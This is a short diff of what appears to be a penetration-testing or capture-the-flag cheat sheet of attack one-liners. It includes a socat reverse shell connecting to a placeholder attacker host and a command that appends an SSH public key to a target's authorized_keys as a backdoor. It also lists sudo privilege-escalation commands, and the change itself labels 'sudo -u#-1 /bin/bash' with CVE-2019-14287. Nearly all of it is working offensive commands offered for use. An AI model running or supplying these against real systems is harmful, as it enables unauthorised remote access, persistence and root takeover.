@@ -23,7 +23,7 @@ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid
 ssh user@10.10.10.10 -i id_rsa  # in our system 
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> /home/user/.ssh/authorized_keys # in target
 -----------------
-sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash # CVE-2019-14287
 sudo -u silvio /usr/bin/zip # run with another user
 sudo -u jordan PYTHONPATH=$PYTHONPATH/tmp/ /opt/scripts/flag.py # run with PYTHONPATH 
 
